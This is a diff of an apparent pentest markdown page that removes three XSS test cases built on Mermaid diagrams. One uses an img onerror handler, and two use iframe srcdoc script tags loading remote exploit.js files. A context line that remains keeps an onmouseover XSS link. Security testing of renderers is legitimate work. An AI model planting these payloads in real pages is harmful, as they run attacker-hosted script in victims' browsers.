@@ -20,25 +20,6 @@ pentest
 [malicious link](something"onmouseover="alert('XSS'))
 
 
-## XSS Test
- ```mermaid
-  graph LR
-      B-->D(<img onerror=location=`javascript\u003aalert\u0028document.domain\u0029` src=x>);
- ```
-
-## XSS Test 2
-```mermaid  
-%%{init: {"flowchart": {"htmlLabels": "false"}} }%%  
-flowchart  
-  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]  
-```
-
-## XSS Test 3
-```mermaid  
-%%{init: {"flowchart": {"htmlLabels": "false"}} }%%  
-flowchart  
-  A["<iframe srcdoc='<script src=https://stg.docs.developer.tech.gov.sg/docs/injection/exploit.js></script>'></iframe>"]  
-```
 
 ## iFrames Test
 
